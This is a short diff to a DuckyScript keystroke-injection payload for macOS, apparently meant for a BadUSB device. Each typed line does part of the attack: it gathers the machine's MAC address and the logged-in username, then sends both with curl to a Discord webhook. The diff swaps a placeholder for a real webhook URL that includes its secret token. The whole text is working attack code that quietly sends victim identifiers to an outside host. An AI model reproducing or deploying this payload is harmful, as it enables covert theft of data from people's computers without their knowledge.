@@ -14,9 +14,12 @@ DELAY 250
 STRING mac=$(networksetup -getmacaddress en0) 
 DELAY 500
 ENTER
+DELAY 250
 STRING name=$(id -un)
 DELAY 250
 ENTER
-STRING curl -X POST -H "Content-Type: application/x-www-form-urlencoded" --data-urlencode "content=User:$name | $mac" https://webhook
+DELAY 250
+STRING curl -X POST -H "Content-Type: application/x-www-form-urlencoded" --data-urlencode "content=User:$name | $mac" https://discord.com/api/webhooks/1296512673327878145/0h0RYRZEzKa3mIOsSYOJFLbRcxs5KUBhxP1oBbWdbKqbPgzKvENd8yKmyxALnTnpylOL
+DELAY 500
 ENTER
 GUI q
